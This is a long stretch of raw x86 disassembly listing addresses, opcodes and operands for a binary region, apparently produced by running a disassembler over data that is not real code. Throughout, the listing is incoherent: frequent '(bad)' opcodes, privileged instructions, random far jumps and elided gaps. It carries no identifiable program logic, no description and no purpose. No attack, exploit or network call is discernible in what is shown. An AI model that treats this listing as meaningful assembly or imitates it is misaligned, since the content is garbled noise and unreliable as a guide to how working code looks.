  41e325:	outs   dx,BYTE PTR ds:[esi]
  41e326:	arpl   WORD PTR [edi-0x34334dc7],sp
  41e32c:	mov    WORD PTR [eax],cs
  41e32e:	addr16 push es
  41e330:	adc    DWORD PTR [eax+0x23],esi
  41e333:	mov    edi,0x73ecbc87
  41e338:	leave  
  41e339:	add    al,0x9f
  41e33b:	sbb    esp,DWORD PTR [ebx]
  41e33d:	xor    DWORD PTR ds:[esi-0x17],esp
  41e341:	jo     0x41e334
  41e343:	das    
  41e344:	sub    bh,BYTE PTR [edi]
  41e346:	push   cs
  41e347:	jl     0x41e39b
  41e349:	add    al,bl
  41e34b:	add    al,0xea
  41e34d:	scas   al,BYTE PTR es:[edi]
  41e34e:	inc    DWORD PTR [eax+edx*2-0x56]
  41e352:	ds jne 0x41e381
  41e355:	jbe    0x41e33b
  41e357:	fnstsw WORD PTR [edx+0x58]
  41e35a:	(bad)  
  41e35b:	fcom   st(0)
  41e35d:	dec    eax
  41e35e:	push   edx
  41e35f:	dec    esp
  41e360:	jb     0x41e3cb
  41e362:	push   esp
  41e363:	or     eax,0xa3f41eba
  41e368:	mov    al,BYTE PTR [edi+edx*2]
  41e36b:	pop    edx
  41e36c:	jmp    0x1e97:0x9c721019
  41e373:	push   edx
  41e374:	or     DWORD PTR ds:0xac991ecf,0x4d
  41e37b:	push   0xffffffa2
  41e37d:	(bad)  
  41e37e:	mov    esi,0x3b22a042
  41e383:	js     0x41e3a7
  41e385:	mov    eax,ds:0xb9a3e004
  41e38a:	mov    DWORD PTR [ebp+0x77a3e22e],edx
  41e390:	push   0x3e
  41e392:	xlat   BYTE PTR ds:[ebx]
  41e393:	les    ebp,FWORD PTR [edi-0xb45ccbb]
  41e399:	mov    esi,DWORD PTR [ebp-0x62cca0ed]
  41e39f:	lea    eax,[ebp+0x3f]
  41e3a2:	(bad)  [edx]
  41e3a4:	and    eax,0x23ce3eae
  41e3a9:	and    dh,BYTE PTR [ecx-0x3d]
  41e3ac:	icebp  
  41e3ad:	popf   
  41e3ae:	sub    dh,BYTE PTR [eax+0x5d]
  41e3b1:	fld    DWORD PTR [eax+0x42987917]
  41e3b7:	(bad)  
  41e3b8:	out    0xc1,eax
  41e3ba:	pop    ss
  41e3bb:	jg     0x41e3e6
  41e3bd:	jnp    0x41e427
  41e3bf:	mov    DWORD PTR [ebp-0x55],ecx
  41e3c2:	jbe    0x41e399
  41e3c4:	push   esp
  41e3c5:	mov    dl,0x82
  41e3c7:	mov    eax,ds:0x6cc7bc75
  41e3cc:	xchg   ebx,eax
  41e3cd:	mov    ah,0x87
  41e3cf:	jb     0x41e389
  41e3d1:	sar    al,cl
  41e3d3:	inc    edx
  41e3d4:	hlt    
  41e3d5:	retf   0xa5ac
  41e3d8:	jg     0x41e419
  41e3da:	xchg   ebp,eax
  41e3db:	pop    eax
  41e3dc:	call   DWORD PTR [ecx-0x4]
  41e3df:	dec    ebp
  41e3e0:	lahf   
  41e3e1:	cdq    
  41e3e2:	out    dx,eax
  41e3e3:	(bad)  
  41e3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3e5:	push   cs
  41e3e6:	or     DWORD PTR [ebp+0x61918044],esi
  41e3ec:	push   ebp
  41e3ed:	mov    DWORD PTR [eax],eax
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x87b75f09
  41e465:	push   ecx
  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	xchg   edi,eax
  41e46f:	add    eax,0x4c7b106e
  41e474:	dec    ebx
  41e475:	inc    ebp
  41e476:	(bad)
  41e47a:	aad    0x2e
  41e47c:	das    
  41e47d:	and    BYTE PTR [ecx-0x5ff92891],bh
  41e483:	fmulp  st(4),st
  41e485:	ins    BYTE PTR es:[edi],dx
  41e486:	clc    
  41e487:	pop    ecx
  41e488:	dec    esp
  41e489:	push   edx
  41e48a:	and    ah,BYTE PTR fs:[eax-0x39]
  41e48e:	inc    esp
  41e48f:	ins    DWORD PTR es:[edi],dx
  41e490:	inc    ecx
  41e491:	jmp    0x77d4:0x2220d656
  41e498:	jge    0x41e4b3
  41e49a:	mov    dh,0xe7
  41e49c:	jmp    DWORD PTR [eax-0x75]
  41e49f:	mov    ds:0x7e3e4362,eax
  41e4a4:	loop   0x41e475
  41e4a6:	pop    ebx
  41e4a7:	or     al,bl
  41e4a9:	ins    BYTE PTR es:[edi],dx
  41e4aa:	push   ebx
  41e4ab:	inc    esp
  41e4ac:	int    0xf5
  41e4ae:	jge    0x41e495
  41e4b0:	les    esp,FWORD PTR [edx+0x203fb231]
  41e4b6:	js     0x41e537
  41e4b8:	popa   
  41e4b9:	test   al,0x4a
  41e4bb:	jae    0x41e527
  41e4bd:	push   esp
  41e4be:	jg     0x41e500
  41e4c0:	(bad)
  41e4c3:	pop    esp
  41e4c4:	js     0x41e537
  41e4c6:	lea    ebx,[eax]
  41e4c8:	or     DWORD PTR [ebp-0x56],ebx
  41e4cb:	out    dx,al
  41e4cc:	mov    bh,0xad
  41e4ce:	sbb    BYTE PTR ds:0x30df9757,ch
  41e4d4:	mov    esp,0x3a4800b
  41e4d9:	push   edx
  41e4da:	cmp    eax,0x2c3a82b5
  41e4df:	pop    ebx
  41e4e0:	sub    DWORD PTR [eax],esp
  41e4e2:	add    BYTE PTR [ecx-0xf7b6724],ah
  41e4e8:	or     cl,BYTE PTR [esi+0x741fa091]
  41e4ee:	jmp    ebp
  41e4f0:	or     bl,BYTE PTR [ebx+esi*1]
  41e4f3:	pop    edi
  41e4f4:	mov    ah,0x4f
  41e4f6:	cld    
  41e4f7:	and    bl,BYTE PTR [esi]
  41e4f9:	cmp    DWORD PTR [eax],esp
  41e4fb:	gs lock inc eax
  41e4fe:	and    DWORD PTR [edx-0x562a79c7],ebp
  41e504:	or     DWORD PTR [eax+0x6ae01e05],ecx
  41e50a:	arpl   WORD PTR [edi+0x1f],si
  41e50d:	stos   BYTE PTR es:[edi],al
  41e50e:	lahf   
  41e50f:	and    ch,ah
  41e511:	daa    
  41e512:	cli    
  41e513:	je     0x41e534
  41e515:	cmp    DWORD PTR [ebp+0x73],ebx
  41e518:	stc    
  41e519:	jl     0x41e589
  41e51b:	pop    eax
  41e51c:	(bad)  [ecx]
  41e51e:	push   es
  41e51f:	jl     0x41e4e5
  41e521:	ins    DWORD PTR es:[edi],dx
  41e522:	mov    ebp,0x36bfdf93
  41e527:	jmp    0x41e4bc
  41e529:	sbb    al,0x2c
  41e52b:	daa    
  41e52c:	shrd   DWORD PTR [ebp-0x3192cdc3],eax,0x8
  41e534:	scas   eax,DWORD PTR es:[edi]
  41e535:	ins    BYTE PTR es:[edi],dx
  41e536:	or     eax,DWORD PTR [esi-0x5d6a0fd0]
  41e53c:	jo     0x41e4dc
  41e53e:	add    BYTE PTR [eax+eiz*1],dh
  41e541:	fs sub al,ah
  41e544:	ins    BYTE PTR es:[edi],dx
  41e545:	retf   
  41e546:	fdiv   QWORD PTR [esp+ebx*4]
  41e549:	cmp    DWORD PTR [esi-0x2462580],ecx
  41e54f:	mov    ch,0x26
  41e551:	lahf   
  41e552:	sub    DWORD PTR [ecx-0x5622ffd0],eax
  41e558:	mov    ah,0x63
  41e55a:	inc    ebp
  41e55b:	ss pop ss
  41e55d:	sub    dl,bl
  41e55f:	(bad)  
  41e560:	iret   
  41e561:	data16 jae 0x41e513
  41e564:	ja     0x41e5b7
  41e566:	pop    ecx
  41e567:	stos   BYTE PTR es:[edi],al
  41e568:	adc    eax,0x9795d799
  41e56d:	test   DWORD PTR [eax],0x0
	...
  41e5d3:	add    BYTE PTR [eax],al
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e63e
  41e5e3:	xlat   BYTE PTR ds:[ebx]
  41e5e4:	mov    eax,0x1466762
  41e5e9:	add    BYTE PTR [eax],al
  41e5eb:	add    DWORD PTR [eax],eax
  41e5ed:	add    BYTE PTR [ecx+ecx*2],ch
  41e5f0:	aam    0xf
  41e5f2:	fcmovbe st,st(0)
  41e5f4:	mov    WORD PTR [ebp+0x741378f0],ds
  41e5fa:	mov    edi,0xe952829a
  41e5ff:	pop    DWORD PTR [ebp-0x1c]
  41e602:	fistp  WORD PTR [esi-0x74a128b3]
  41e608:	mov    WORD PTR [esi+ebp*1-0x52],?
  41e60c:	lock inc ecx
  41e60e:	imul   ebx,DWORD PTR [ecx],0x40
  41e611:	rol    dh,1
  41e613:	lock and eax,0x27321654
  41e619:	jmp    0x5362:0x648e71ed
  41e620:	xor    al,0x6
  41e622:	mov    ecx,0x2a428fa6
  41e627:	shl    DWORD PTR [ecx-0x1877049d],1
  41e62d:	add    cl,BYTE PTR [ebx+0x72]
  41e630:	mov    eax,ds:0x2f15b4ca
  41e635:	xor    ch,BYTE PTR [edi+0x547c647]
  41e63b:	adc    DWORD PTR [edx],edi
  41e63d:	mov    eax,ds:0x925f7f1e
  41e642:	fnsave [esi]
  41e644:	(bad)  
  41e645:	jmp    0x41e69d
  41e647:	and    eax,0x710f6919
  41e64c:	ds scas al,BYTE PTR es:[edi]
  41e64e:	jmp    0x766d:0x928d6dac
  41e655:	sti    
  41e656:	mov    dh,0x46
  41e658:	inc    eax
  41e659:	push   esp
  41e65a:	sbb    BYTE PTR [ebp+0x75b3dd3e],bl
  41e660:	(bad)  [ebp-0x3c]
  41e663:	les    esi,FWORD PTR [ebp+0x75]
  41e666:	(bad)  
  41e668:	jg     0x41e6d6
  41e66a:	jmp    0x68a01a44
  41e66f:	(bad)  
  41e670:	ins    DWORD PTR es:[edi],dx
  41e671:	js     0x41e622
  41e673:	mov    edx,0x62432679
  41e678:	les    esp,FWORD PTR [eax-0x7f]
  41e67b:	pop    ecx
  41e67c:	mov    dl,BYTE PTR [ecx+0x7c5e3ec0]
  41e682:	pop    ebx
  41e683:	test   edx,0x43c30619
  41e689:	stos   BYTE PTR es:[edi],al
  41e68a:	inc    ecx
  41e68b:	loop   0x41e6b2
  41e68d:	enter  0xe582,0x9d
  41e691:	push   0xe2a6d58f
  41e696:	dec    ebp
  41e697:	cdq    
  41e698:	inc    esp
  41e699:	inc    esi
  41e69a:	cmp    eax,0x933d904
  41e69f:	out    0xdf,al
  41e6a1:	enter  0x6b76,0xdd
  41e6a5:	mov    ebp,DWORD PTR [eax]
  41e6a7:	sbb    ebx,ecx
  41e6a9:	retf   0xcd5a
  41e6ac:	lock xchg edx,eax
  41e6ae:	xchg   ebp,eax
  41e6af:	pop    edi
  41e6b0:	sub    bl,bl
  41e6b2:	jecxz  0x41e721
  41e6b4:	das    
  41e6b5:	xchg   esp,eax
  41e6b6:	push   es
  41e6b7:	test   BYTE PTR [eax+0x1d],bh
  41e6ba:	adc    DWORD PTR [esp+ebx*8+0xb09ddfc],0xffffffb1
  41e6c2:	rcl    DWORD PTR [eax],1
  41e6c4:	bound  ebx,QWORD PTR [ecx+0x649ac09a]
  41e6ca:	sbb    al,0x30
  41e6cc:	push   es
  41e6cd:	mov    ds:0x50917245,eax
  41e6d2:	pop    esi
  41e6d3:	and    DWORD PTR [ecx+0x218cca7d],eax
  41e6d9:	adc    DWORD PTR [edx+0x11],edx
  41e6dc:	fs mov al,0x13
  41e6df:	rol    DWORD PTR [esi-0x6a4fc82],0x75
  41e6e6:	jle    0x41e6ff
  41e6e8:	stos   DWORD PTR es:[edi],eax
  41e6e9:	sbb    BYTE PTR [esi+0x5c],cl
  41e6ec:	scas   al,BYTE PTR es:[edi]
  41e6ed:	mov    edx,0x0
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ecx,DWORD PTR [ecx+0x6762f33f]
  41e767:	inc    edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	dec    esi
  41e76f:	inc    ebx
  41e770:	int3   
  41e771:	pop    ecx
  41e772:	add    dh,BYTE PTR [edi+ebx*4-0x77b0d21e]
  41e779:	inc    eax
  41e77a:	and    edx,edi
  41e77c:	gs pushf 
  41e77e:	jno    0x41e77f
  41e780:	sbb    eax,0x7ae4040a
  41e785:	popf   
  41e786:	add    eax,0x69eddcf8
  41e78b:	in     eax,dx
  41e78c:	cdq    
  41e78d:	outs   dx,DWORD PTR ds:[esi]
  41e78e:	iret   
  41e78f:	add    edi,DWORD PTR [ebp-0x492fbd68]
  41e795:	jno    0x41e719
  41e797:	jo     0x41e72b
  41e799:	adc    DWORD PTR [ecx],edi
  41e79b:	lods   eax,DWORD PTR ds:[esi]
  41e79c:	push   0x20a0acd2
  41e7a1:	mov    dl,0x4d
  41e7a3:	jo     0x41e7ca
  41e7a5:	fldenv ds:0x8185d256
  41e7ab:	ret    0x66bc
  41e7ae:	xor    bh,BYTE PTR [edi-0x33]
  41e7b1:	push   es
  41e7b2:	jbe    0x41e801
  41e7b4:	or     al,0xfb
  41e7b6:	stc    
  41e7b7:	loop   0x41e739
  41e7b9:	inc    ebp
  41e7ba:	scas   eax,DWORD PTR es:[edi]
  41e7bb:	in     eax,dx
  41e7bc:	sub    dh,BYTE PTR [edx]
  41e7be:	mov    DWORD PTR [eax+ebp*4],esp
  41e7c1:	mov    eax,0x32e99c22
  41e7c6:	in     al,0xa
  41e7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c9:	test   eax,0x9d76ea3d
  41e7ce:	aas    
  41e7cf:	mov    BYTE PTR [ecx+esi*4-0x5885fea6],ah
  41e7d6:	inc    DWORD PTR [ebp-0x28]
  41e7d9:	sti    
  41e7da:	pop    esi
  41e7db:	jge    0x41e807
  41e7dd:	test   eax,0xe76e04bd
  41e7e2:	rol    cl,cl
  41e7e4:	mov    bl,0xe1
  41e7e6:	push   edx
  41e7e7:	cld    
  41e7e8:	xchg   BYTE PTR [edx+eiz*1+0x3c43e695],dh
  41e7ef:	mov    esp,0xb7309565
  41e7f4:	push   0xd05aaf7
  41e7f9:	ins    BYTE PTR es:[edi],dx
  41e7fa:	fwait
  41e7fb:	jmp    0x4f6a:0x8a8ca4b7
  41e802:	scas   al,BYTE PTR es:[edi]
  41e803:	xchg   esp,eax
  41e804:	push   es
  41e805:	mov    esi,0x1ac6c3fa
  41e80a:	adc    ebx,DWORD PTR [esi]
  41e80c:	cmp    eax,DWORD PTR [ebx+0x11]
  41e80f:	sub    bl,BYTE PTR [edi]
  41e811:	xor    DWORD PTR [edx],0x1e2299b7
  41e817:	js     0x41e7a2
  41e819:	push   ds
  41e81a:	dec    ebp
  41e81b:	cs arpl bx,ax
  41e81e:	(bad)  
  41e81f:	fcomi  st,st(2)
  41e821:	push   ebp
  41e822:	push   es
  41e823:	push   0xc1cb8330
  41e828:	aaa    
  41e829:	lock jmp 0xa1b6448c
  41e82f:	loop   0x41e836
  41e831:	stc    
  41e832:	or     cl,BYTE PTR [eax]
  41e834:	scas   eax,DWORD PTR es:[edi]
  41e835:	(bad)  
  41e836:	sbb    al,0x9c
  41e838:	std    
  41e839:	dec    edx
  41e83a:	sub    BYTE PTR [eax+edx*4+0x78a1c5bf],dh
  41e841:	pop    esp
  41e842:	inc    ebp
  41e843:	rcr    bh,0xc2
  41e846:	es cdq 
  41e848:	sub    al,0x9c
  41e84a:	cmc    
  41e84b:	cmp    ah,BYTE PTR [ebp+0x73]
  41e84e:	iret   
  41e84f:	frstor [edi+ecx*1]
  41e852:	jnp    0x41e7d5
  41e854:	and    al,0x47
  41e856:	fldenv [ecx+0x2d]
  41e859:	sti    
  41e85a:	jge    0x41e86e
  41e85c:	ret    0xe332
  41e85f:	mov    esi,0x9c0991d4
  41e864:	sbb    al,0xac
  41e866:	push   ss
  41e867:	dec    edi
  41e868:	mov    BYTE PTR [esi+0x173b914a],al
	...
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e89b
  41e8e3:	add    dl,0xaf
  41e8e6:	addr16 dec eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	arpl   WORD PTR [eax+0x1e94fbda],dx
  41e8f4:	inc    edx
  41e8f5:	sbb    eax,0xd71b72a7
  41e8fa:	addr16 aad 0x9e
  41e8fd:	jp     0x41e88d
  41e8ff:	shl    BYTE PTR [esi-0x1f0758e2],1
  41e905:	push   esp
  41e906:	cmp    al,0x50
  41e908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e909:	jle    0x41e8dd
  41e90b:	dec    BYTE PTR [ebx-0x13]
  41e90e:	and    eax,0x494f103d
  41e913:	pop    ecx
  41e914:	lock xor eax,0xc26d3145
  41e91a:	adc    ah,BYTE PTR [ecx]
  41e91c:	hlt    
  41e91d:	xlat   BYTE PTR ds:[ebx]
  41e91e:	fwait
  41e91f:	(bad)  
  41e920:	gs aaa 
  41e922:	lea    edx,[edx+0x5]
  41e925:	push   esp
  41e926:	mov    BYTE PTR [eax-0x1],cl
  41e929:	(bad)  
  41e92a:	cld    
  41e92b:	jmp    0x6d05:0x75dd54d8
  41e932:	in     eax,dx
  41e933:	hlt    
  41e934:	lds    ecx,FWORD PTR ds:0x7ebd8bdf
  41e93a:	adc    eax,DWORD PTR [eax]
  41e93c:	int3   
  41e93d:	adc    BYTE PTR [ebx+0x4a904a56],0x4
  41e944:	inc    ecx
  41e945:	dec    esp
  41e946:	jno    0x41e921
  41e948:	test   al,0x7
  41e94a:	call   0x98694877
  41e94f:	push   0x60
  41e951:	sti    
  41e952:	fld    QWORD PTR [edx+0x469fb02]
  41e958:	xor    BYTE PTR [edi+0x3cf798e0],0xe0
  41e95f:	add    eax,0x159f5d3a
  41e964:	mov    WORD PTR [esi-0x7],ss
  41e967:	mov    ecx,0x5373c34f
  41e96c:	hlt    
  41e96d:	fiadd  WORD PTR [ebx+edx*8+0x21]
  41e971:	sub    eax,0xc309ab29
  41e976:	dec    ebp
  41e977:	jg     0x41e9e8
  41e979:	inc    ebx
  41e97a:	sub    ah,BYTE PTR ds:0x7ab91b93
  41e980:	pop    edi
  41e981:	pop    eax
  41e982:	aas    
  41e983:	outs   dx,DWORD PTR ds:[esi]
  41e984:	bound  ebx,QWORD PTR [ebx-0x6f]
  41e987:	jns    0x41ea05
  41e989:	lock dec esp
  41e98b:	repnz add DWORD PTR ss:[edx+0x57bdaef7],esp
  41e993:	les    ebx,FWORD PTR [edi]
  41e995:	sub    eax,0x2f4694fe
  41e99a:	retf   0xe148
  41e99d:	in     al,dx
  41e99e:	outs   dx,DWORD PTR ds:[esi]
  41e99f:	pop    eax
  41e9a0:	(bad)  
  41e9a1:	(bad)  
  41e9a2:	sar    ecx,1
  41e9a4:	repnz mov dh,0xa2
  41e9a7:	nop
  41e9a8:	add    DWORD PTR [esi+0x245c2de],edx
  41e9ae:	pusha  
  41e9af:	ins    DWORD PTR es:[edi],dx
  41e9b0:	mov    DWORD PTR [ecx+0x21ecf6db],0x3672284a
  41e9ba:	xor    BYTE PTR [eax],ch
  41e9bc:	add    eax,0x7ce7498b
  41e9c1:	jb     0x41e95b
  41e9c3:	sti    
  41e9c4:	jnp    0x41e9cc
  41e9c6:	mov    ch,0x9b
  41e9c8:	test   al,0xde
  41e9ca:	and    BYTE PTR [eax+0x6],0xd6
  41e9ce:	shr    BYTE PTR [edi],1
  41e9d0:	mov    esi,DWORD PTR [ecx-0x735b80b4]
  41e9d6:	pop    es
  41e9d7:	test   eax,0xab9bbb28
  41e9dc:	xor    BYTE PTR [edx],ch
  41e9de:	adc    BYTE PTR [ebp-0x73],0x15
  41e9e2:	test   eax,0xc0d82dc6
  41e9e7:	aaa    
  41e9e8:	inc    ebp
  41e9e9:	inc    edi
  41e9ea:	cmp    bl,BYTE PTR [esp+eiz*2+0x5e]
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	in     al,dx
  41ea63:	out    dx,al
  41ea64:	rcr    BYTE PTR [ecx],cl
  41ea66:	addr16 dec ecx
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	push   ebx
  41ea6f:	cdq    
  41ea70:	or     bl,BYTE PTR [edx-0x70]
  41ea73:	adc    al,0xb5
  41ea75:	adc    DWORD PTR [ebx],edx
  41ea77:	test   DWORD PTR [eax+0xfcd3360],edi
  41ea7d:	pop    es
  41ea7e:	fmul   QWORD PTR [esi+0x1376fc94]
  41ea84:	retf   
  41ea85:	pop    esi
  41ea86:	dec    ebp
  41ea87:	and    eax,edx
  41ea89:	mov    ecx,0x23abee8b
  41ea8e:	(bad)  
  41ea8f:	xchg   ebp,eax
  41ea90:	jmp    0xd25a:0x1bd3e395
  41ea97:	inc    edx
  41ea98:	imul   esp,DWORD PTR [esi],0x0
  41ea9b:	mov    esi,0x5305cb32
  41eaa0:	mov    edi,0x94f4ff27
  41eaa5:	inc    edi
  41eaa6:	(bad)  
  41eaa7:	lock pop edi
  41eaa9:	jg     0x41ea5c
  41eaab:	test   al,0x9
  41eaad:	sub    al,0xc6
  41eaaf:	in     eax,0x5
  41eab1:	jo     0x41ea92
  41eab3:	inc    esi
  41eab4:	imul   edi,DWORD PTR [ecx-0x2a729],0x12
  41eabb:	retf   0xc0a0
  41eabe:	mov    al,0xad
  41eac0:	js     0x41ea74
  41eac2:	cmc    
  41eac3:	and    cl,BYTE PTR [edi-0x538bd099]
  41eac9:	xor    eax,0xbf8be865
  41eace:	and    esi,DWORD PTR [ebx]
  41ead0:	outs   dx,BYTE PTR ds:[esi]
  41ead1:	mov    ebp,0x94ceeb50
  41ead6:	jb     0x41ea62
  41ead8:	call   0x610b:0xdbf592e8
  41eadf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eae0:	jnp    0x41ea8d
  41eae2:	jbe    0x41eb24
  41eae4:	fwait
  41eae5:	ds jb  0x41eae5
  41eae8:	add    eax,0x6819b100
  41eaed:	fstp   DWORD PTR [eax+0x100034ca]
  41eaf3:	push   esi
  41eaf4:	cwde   
  41eaf5:	sub    al,0x7f
  41eaf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf8:	ret    0x5ee9
  41eafb:	paddd  mm1,QWORD PTR [ebx+esi*8-0x3e]
  41eb00:	retf   
  41eb01:	cmp    bh,bl
  41eb03:	push   ebp
  41eb04:	xlat   BYTE PTR ds:[ebx]
  41eb05:	fiadd  DWORD PTR [ebp+0x12d9a5b7]
  41eb0b:	aas    
  41eb0c:	sub    BYTE PTR [ecx+0x6a60e3e3],dl
  41eb12:	pop    eax
  41eb13:	adc    esp,DWORD PTR [esi-0xa058e03]
  41eb19:	jg     0x41eaf0
  41eb1b:	xchg   ebx,eax
  41eb1c:	push   ecx
  41eb1d:	xor    edx,DWORD PTR [ebp-0x2a0853d4]
  41eb23:	in     eax,dx
  41eb24:	sub    BYTE PTR [edi+0x56],bl
  41eb27:	cld    
  41eb28:	inc    ecx
  41eb29:	and    ecx,DWORD PTR [eax-0x463f39a4]
  41eb2f:	push   0x10
  41eb31:	and    al,0x4e
  41eb33:	push   ebp
  41eb34:	shr    BYTE PTR [ecx-0x4cfe3f65],cl
  41eb3a:	mov    edx,0x6b3e5892
  41eb3f:	adc    BYTE PTR [esi+0x5255559d],al
  41eb45:	mov    ch,0x57
  41eb47:	add    ch,BYTE PTR [edx-0x33791c9a]
  41eb4d:	xchg   ecx,eax
  41eb4e:	xor    al,0x6d
  41eb50:	js     0x41eb48
  41eb52:	int    0x20
  41eb54:	rcr    ah,1
  41eb56:	sahf   
  41eb57:	shl    DWORD PTR [edx+0x468aa679],1
  41eb5d:	popf   
  41eb5e:	cli    
  41eb5f:	je     0x41eae6
  41eb61:	jae    0x41eb61
  41eb63:	lods   al,BYTE PTR ds:[esi]
  41eb64:	clc    
  41eb65:	and    BYTE PTR [edi],dl
  41eb67:	aaa    
  41eb68:	jle    0x41eb24
  41eb6a:	push   ss
  41eb6b:	into   
  41eb6c:	lods   al,BYTE PTR ds:[esi]
  41eb6d:	adc    al,BYTE PTR [eax]
	...
  41ebd3:	add    BYTE PTR [eax],al
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x40
  41ebe3:	retf   
  41ebe4:	mov    ebp,0x14a675d
  41ebe9:	add    BYTE PTR [eax],al
  41ebeb:	add    DWORD PTR [eax],eax
  41ebed:	add    cl,al
  41ebef:	popa   
  41ebf0:	mov    esp,0x61620fbc
  41ebf5:	sbb    al,0xd2
  41ebf7:	jg     0x41ec23
  41ebf9:	shl    BYTE PTR [esi+0x31],1
  41ebfc:	ret    0xe7ce
  41ebff:	(bad)  
  41ec00:	xlat   BYTE PTR ds:[ebx]
  41ec01:	scas   al,BYTE PTR es:[edi]
  41ec02:	popf   
  41ec03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec04:	imul   esp,esi,0xc1bccd7f
  41ec0a:	div    DWORD PTR [eax+0x5c25f12b]
  41ec10:	jb     0x41ebfd
  41ec12:	dec    esi
  41ec13:	sbb    al,0xa
  41ec15:	je     0x41ec83
  41ec17:	push   edi
  41ec18:	imul   edx,DWORD PTR [edx+0x6e],0x65
  41ec1c:	sbb    BYTE PTR [edx-0x7c1337ba],dh
  41ec22:	push   esi
  41ec23:	sti    
  41ec24:	add    eax,0x882aef3a
  41ec29:	xchg   BYTE PTR [edx+esi*1-0x28],ch
  41ec2d:	xor    eax,0xf7668ba7
  41ec32:	sbb    ebx,eax
  41ec34:	mov    ds:0x5b7e459e,eax
  41ec39:	rol    esi,1
  41ec3b:	pop    edx
  41ec3c:	sub    eax,0xeef04b6a
  41ec41:	lds    ebx,FWORD PTR [esi-0x2daadb03]
  41ec47:	and    DWORD PTR [edi+ebx*1],0xffffffa2
  41ec4b:	in     al,dx
  41ec4c:	in     eax,dx
  41ec4d:	xor    eax,DWORD PTR [edx-0x5]
  41ec50:	fistp  DWORD PTR [eax+0x47]
  41ec53:	pop    ebx
  41ec54:	jp     0x41ecd4
  41ec56:	test   BYTE PTR [eax-0x71c41ec9],dh
  41ec5c:	aas    
  41ec5d:	sbb    al,al
  41ec5f:	xchg   edx,eax
  41ec60:	sub    DWORD PTR [edx],ecx
  41ec62:	ja     0x41ecc9
  41ec64:	lods   eax,DWORD PTR ds:[esi]
  41ec65:	jmp    0x34f1:0x4f9c5705
  41ec6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec6d:	lods   eax,DWORD PTR ds:[si]
  41ec6f:	out    0x2a,al
  41ec71:	jge    0x41ec9e
  41ec73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec74:	iret   
  41ec75:	into   
  41ec76:	xor    DWORD PTR es:[ebp-0x37],eax
  41ec7a:	je     0x41ec77
  41ec7c:	cld    
  41ec7d:	sbb    eax,0x8ac59d48
  41ec82:	fwait
  41ec83:	pushf  
  41ec84:	add    eax,0x93cb66a2
  41ec89:	jp     0x41ecb2
  41ec8b:	dec    DWORD PTR [edx-0x6162fb0e]
  41ec91:	arpl   WORD PTR [eax+0x55cde239],cx
  41ec97:	inc    edi
  41ec98:	add    ebp,DWORD PTR [eax+0x430d7ba9]
  41ec9e:	sahf   
  41ec9f:	test   eax,0x9c056791
  41eca4:	inc    esi
  41eca5:	icebp  
  41eca6:	mov    edx,0xa80a3cce
  41ecab:	push   eax
  41ecac:	mov    edx,0xe850373
  41ecb1:	push   es
  41ecb2:	add    ch,BYTE PTR [ebx-0x4f2f2fc0]
  41ecb8:	sti    
  41ecb9:	push   ds
  41ecba:	call   DWORD PTR [ebx+ebp*4+0x7f]
  41ecbe:	sbb    al,0x90
  41ecc0:	xchg   ebp,esp
  41ecc2:	sub    eax,0x77b18490
  41ecc7:	cmp    DWORD PTR [edx],ebx
  41ecc9:	add    cl,BYTE PTR [esi+0x643c44c]
  41eccf:	enter  0x17c6,0x2a
  41ecd3:	dec    edi
  41ecd4:	(bad)  
  41ecd5:	push   0x6f
  41ecd7:	pop    ss
  41ecd8:	leave  
  41ecd9:	call   0x5ac357a7
  41ecde:	dec    ebp
  41ecdf:	test   eax,0x884f4054
  41ece4:	in     al,0xf8
  41ece6:	or     BYTE PTR [edx-0x7a],0xc5
  41ecea:	ret    
  41eceb:	pop    es
  41ecec:	xor    DWORD PTR [ecx+0x0],ebx
	...
  41ed53:	add    BYTE PTR [eax],al
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0x71405fd0
  41ed64:	outs   dx,DWORD PTR ds:[esi]
  41ed65:	hlt    
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
